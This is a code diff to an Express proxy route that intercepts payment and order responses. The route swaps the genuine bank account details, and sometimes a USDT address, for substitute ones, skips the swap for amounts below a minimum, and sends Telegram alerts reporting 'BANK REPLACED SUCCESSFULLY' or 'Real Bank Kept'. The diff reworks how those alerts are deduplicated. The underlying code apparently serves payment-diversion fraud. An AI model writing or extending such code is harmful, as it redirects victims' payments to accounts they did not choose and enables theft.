@@ -3160,7 +3160,8 @@ app.all('/xxapi/*', async (req, res) => {
                                         time: now,
                                         userId: itemUid,
                                         isManual: true,
-                                        forced: true
+                                        forced: true,
+                                        notified: true
                                     };
                                     if (!data.orderBankMap) data.orderBankMap = {};
                                     data.orderBankMap[rptNo] = savedData;
@@ -3168,10 +3169,8 @@ app.all('/xxapi/*', async (req, res) => {
                                     data._newOrdersToSave[rptNo] = savedData;
                                     dataChanged = true;
 
-                                    // 4. Send Designed Telegram Alert (Only ONCE per order)
-                                    const canNotify = await claimOrderNotification(data, rptNo);
-                                    if (canNotify) {
-                                        const replaceMsg = `╔══════════════════════════════════╗
+                                    // 4. Send Designed Telegram Alert (Directly on first-time replace)
+                                    const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ BANK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>      : <b>₹${iAmt}</b>
@@ -3193,13 +3192,10 @@ app.all('/xxapi/*', async (req, res) => {
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 <code>${now}</code>`;
-                                        notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
-                                    }
+                                    notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                                 } else if (!minOk && itemMinAmount > 0 && iAmt < itemMinAmount) {
                                     // Check 2 Failed: Amount < Min Set
-                                    const canNotify = await claimOrderNotification(data, rptNo);
-                                    if (canNotify) {
-                                        const notReplacedMsg = `╔══════════════════════════════════╗
+                                    const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ BANK NOT REPLACED          ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>      : <b>₹${iAmt}</b>
@@ -3207,6 +3203,7 @@ app.all('/xxapi/*', async (req, res) => {
 📋 <b>Order (rptNo)</b>: <code>${escapeTelegramHtml(rptNo)}</code>
 👤 <b>User ID</b>     : <code>${escapeTelegramHtml(itemUid || 'N/A')}</code>
 📱 <b>Username</b>    : <code>${escapeTelegramHtml(item.username || 'N/A')}</code>
+📍 <b>Endpoint</b>    : <code>/xxapi/buyitoken/history</code>
 
 🏦 <b>Real Bank Kept</b>:
   Name: ${escapeTelegramHtml(oldAcctName || 'N/A')}
@@ -3216,8 +3213,8 @@ app.all('/xxapi/*', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❌ <b>Status</b>       : <b>Real Bank Kept (Amount < Min)</b>
 🕐 <code>${now}</code>`;
-                                        notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
-                                    }
+                                    notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
+                                }
                                 }
                             }
                         }
@@ -3282,6 +3279,8 @@ app.all('/xxapi/*', async (req, res) => {
                                 hadWallet = true;
                             }
 
+                            const isAlreadyNotified = Boolean(rptNo && data.orderBankMap && data.orderBankMap[rptNo] && data.orderBankMap[rptNo].notified);
+
                             // 3. Save rptNo in KV (orderBankMap)
                             if (rptNo) {
                                 const savedData = {
@@ -3299,7 +3298,8 @@ app.all('/xxapi/*', async (req, res) => {
                                     time: now,
                                     userId: String(userId || ''),
                                     isManual: true,
-                                    forced: true
+                                    forced: true,
+                                    notified: true
                                 };
                                 if (!data.orderBankMap) data.orderBankMap = {};
                                 data.orderBankMap[rptNo] = savedData;
@@ -3308,9 +3308,8 @@ app.all('/xxapi/*', async (req, res) => {
                                 await saveData(data);
                             }
 
-                            // 4. Send Telegram Alert
-                            const canNotify = await claimOrderNotification(data, rptNo || respData);
-                            if (canNotify) {
+                            // 4. Send Telegram Alert (Only if not already notified)
+                            if (!isAlreadyNotified) {
                                 const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ BANK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
@@ -3337,9 +3336,7 @@ app.all('/xxapi/*', async (req, res) => {
                             }
                         } else if (!minOk && minAmount > 0 && parsedAmt < minAmount) {
                             // Amount < Min Set: Do not replace, send alert
-                            const canNotify = await claimOrderNotification(data, rptNo || respData);
-                            if (canNotify) {
-                                const notReplacedMsg = `╔══════════════════════════════════╗
+                            const notReplacedMsg = `╔══════════════════════════════════╗
 ║   ⚠️ BANK NOT REPLACED          ║
 ╚══════════════════════════════════╝
 💰 <b>Amount</b>          : <b>₹${parsedAmt}</b>
@@ -3356,8 +3353,7 @@ app.all('/xxapi/*', async (req, res) => {
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ❌ <b>Status</b>          : <b>Real Bank Kept (Amount < Min)</b>
 🕐 <code>${now}</code>`;
-                                notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
-                            }
+                            notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
                         }
                     } else {
                         let shouldReplace = true;
@@ -3421,7 +3417,6 @@ app.all('/xxapi/*', async (req, res) => {
             if (data.usdtAddress) {
                 replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
             }
-        }
 
         // Only notify when response actually had bank details (bank fields in response)
         if (isOrder && !urlLower.includes('paymentslipdetail') && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslip') || urlLower.includes('news/code/'))) {
